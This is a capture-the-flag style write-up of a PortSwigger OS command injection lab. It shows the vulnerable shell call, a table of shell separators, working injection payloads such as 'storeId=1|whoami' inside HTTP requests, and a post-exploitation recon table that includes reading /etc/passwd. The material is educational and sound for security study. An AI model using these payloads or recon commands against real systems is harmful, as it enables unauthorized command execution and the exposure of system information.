# OS Command Injection — Simple Case

> This writeup follows the OWASP Web Security Testing Guide (WSTG) methodology.

---

## Goal

Execute the `whoami` command to determine the name of the current user.

---

## Lab

https://portswigger.net/web-security/os-command-injection/lab-simple

---

## OWASP Category

A03:2021 – Injection

---

## Core Concept

**OS Command Injection** (also called Shell Injection) happens when an application passes user-supplied input directly to a system shell without proper sanitization. Instead of just data, the attacker injects actual operating system commands.

Think of it like this — the application is doing something like:

```python
# Application code (vulnerable)
os.system("stockreport.pl " + productID + " " + storeID)
```

If `productID` is `381` and `storeID` is `29`, the command becomes:
```bash
stockreport.pl 381 29
```

But if an attacker sets `productID` to `381 & whoami &`, the command becomes:
```bash
stockreport.pl 381 & whoami & 29
```

The `&` is a **shell command separator** — it chains multiple commands together. So now three commands run:
1. `stockreport.pl 381` → original (may error)
2. `whoami` → attacker's command 
3. `29` → treated as command (errors)

### Shell Command Separators

| Separator | Works on | Behaviour |
|-----------|----------|-----------|
| `&` | Windows + Unix | Run both commands, second runs regardless |
| `&&` | Windows + Unix | Run second only if first succeeds |
| `\|` | Windows + Unix | Pipe output of first into second |
| `\|\|` | Windows + Unix | Run second only if first fails |
| `;` | Unix only | Run both commands sequentially |
| `\n` (newline) | Unix only | New line = new command |
| `` `cmd` `` | Unix only | Inline execution |
| `$(cmd)` | Unix only | Inline execution |

---

## Steps to Solve

---

**Step 1 — Find the Injection Point**

Navigate to any product page and click **Check stock**. Intercept this request in ZAP:

```http
POST /product/stock HTTP/1.1
Host: lab-id.web-security-academy.net

productId=1&storeId=1
```

Both `productId` and `storeId` are passed to a shell command — either is injectable.

<img width="946" height="436" alt="image" src="https://github.com/user-attachments/assets/92662177-ef21-4782-87cf-8c4af7f5a115" />

---

**Step 2 — Confirm Injection**

Modify `storeId` to include a command separator and test command:

```http
productId=1&storeId=1|whoami
```

Or with `&`:

```http
productId=1&storeId=1%26whoami%26
```

> `%26` is URL-encoded `&`

If the output of `whoami` appears in the response → injection confirmed 

---

**Step 3 — Execute whoami**

Best payload — using `|` pipe which cleanly passes output:

```http
productId=1&storeId=1|whoami
```

The response contains the current user name.

<img width="493" height="516" alt="image" src="https://github.com/user-attachments/assets/590d414a-c661-4d02-a517-de42acb1dcc5" />

---

**Lab Solved**

<img width="1570" height="553" alt="image" src="https://github.com/user-attachments/assets/1804a0a4-5a77-4b49-bbb6-fd62a40c0b2f" />

---

## Useful Recon Commands

Once injection is confirmed, these commands reveal system information:

| Goal | Linux | Windows |
|------|-------|---------|
| Current user | `whoami` | `whoami` |
| Hostname | `hostname` | `hostname` |
| OS version | `uname -a` | `ver` |
| Network config | `ifconfig` | `ipconfig /all` |
| Network connections | `netstat -an` | `netstat -an` |
| Running processes | `ps -ef` | `tasklist` |
| List files | `ls -la` | `dir` |
| Read file | `cat /etc/passwd` | `type C:\windows\win.ini` |

---

*This writeup is intended for educational purposes only. All techniques documented here were performed on PortSwigger's intentionally vulnerable practice platform. The author does not encourage or condone the use of these methods against any system without explicit written permission. Unauthorized use of these techniques may violate applicable laws and regulations.*
